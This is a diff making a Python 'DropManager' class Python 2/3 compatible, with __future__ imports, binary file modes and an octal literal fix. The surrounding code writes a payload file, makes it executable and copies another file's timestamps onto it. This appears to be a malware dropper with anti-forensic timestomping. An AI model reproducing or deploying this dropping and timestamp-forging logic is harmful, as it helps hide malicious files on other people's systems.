@@ -1,10 +1,18 @@
 # -*- coding: utf-8 -*-
 
+from __future__ import absolute_import
+from __future__ import division
+from __future__ import print_function
+from __future__ import unicode_literals
+
 import os
 import subprocess
 import random
 import stat
 import pwd
+
+from io import open
+
 
 class DropManager(object):
     def __init__(self):
@@ -21,7 +29,7 @@ class DropManager(object):
 
         self._home = self._home or os.path.expanduser('~')
 
-        self._devnull = open(os.devnull, 'r')
+        self._devnull = open(os.devnull, 'rb')
         self._rc = []
         self._rc_error = None
 
@@ -110,7 +118,7 @@ class DropManager(object):
     def _check_writable(self, path):
         try:
             if os.path.isfile(path):
-                with open(path, 'w'):
+                with open(path, 'wb'):
                     return True
         except:
             pass
@@ -246,11 +254,11 @@ class DropManager(object):
                     if os.path.isfile(target):
                         os.unlink(target)
 
-                    with open(target, 'w+') as droppie:
+                    with open(target, 'w+b') as droppie:
                         droppie.write(payload)
 
                     if not lib:
-                        os.chmod(target, 0711)
+                        os.chmod(target, 0o711)
 
                     os.utime(target, (shstat.st_atime, shstat.st_ctime))
                     return target
@@ -262,7 +270,7 @@ class DropManager(object):
             dropdir = os.path.dirname(target)
             try:
                 os.makedirs(dropdir)
-                with open(target, 'w') as droppie:
+                with open(target, 'wb') as droppie:
                     droppie.write(payload)
 
                 os.utime(target, (shstat.st_atime, shstat.st_ctime))
